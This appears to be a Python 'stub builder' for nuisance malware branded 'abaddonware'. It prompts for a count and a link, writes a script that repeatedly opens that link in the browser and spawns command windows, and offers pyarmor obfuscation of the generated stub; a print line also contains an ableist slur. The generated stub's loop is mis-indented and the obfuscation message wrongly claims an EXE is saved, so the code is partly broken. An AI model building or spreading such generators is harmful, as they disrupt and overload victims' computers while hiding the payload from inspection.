import os
from colorama import *
import time


def main():
    os.system("cls")
    print(f"\n{Style.NORMAL}{Fore.RESET}dose{Style.DIM}{Fore.MAGENTA}ware{Fore.RESET}{Style.NORMAL}")

    print("\nSpam Amount\n")
    times = input(f"> {Style.DIM}{Fore.MAGENTA}")



    os.system("cls")
    print(f"{Style.NORMAL}{Fore.RESET}abaddon{Style.DIM}{Fore.MAGENTA}ware{Fore.RESET}{Style.NORMAL}")
    print(f"\n{Style.NORMAL}{Fore.RESET}Enter A Link To Spam\n")
    msg = input(f"> {Style.DIM}{Fore.MAGENTA}")


    file666 = f"""
    for _ in range({times}):
    webbrowser.open("{msg}")
    os.system("start cmd")"""

    os.system("cls")
    print(f"{Style.NORMAL}{Fore.RESET}abaddon{Style.DIM}{Fore.MAGENTA}ware{Fore.RESET}{Style.NORMAL}")
    print(f"\n{Style.NORMAL}{Fore.RESET}Set A Name A For The Stub\n")
    filename = input(f"> {Style.DIM}{Fore.MAGENTA}")

    with open(f"{filename}.py", "w") as file:
        file.write("import os\n")
        file.write("import webbrowser\n")
        file.write(f"{file666}")

    time.sleep(1)
    print(f"{Style.NORMAL}{Fore.RESET}[ {Fore.GREEN}+{Fore.RESET} ] {Fore.GREEN}{filename}.py{Fore.RESET} Has Been Generated Successfully\n")
    print(f"{Style.NORMAL}Addittional settings: 1 -> obfuscate  |  2 -> compile")
    print("ctrl + c to exit")
    ask1 = input(">")
 

    if ask1 == "1":
        os.system("pip install pyarmor")
        os.system(f"pyarmor gen {filename}.py")
        print("The EXE has been saved in the build directory")
    if ask1 == "2":
        print(f"{Fore.RED}my retarded ass is bored wait lol")
        time.sleep(2)
    else:
        print(f"{ask1} is incorrect")


        #way to bored to color these
        #will when i add compile

main()


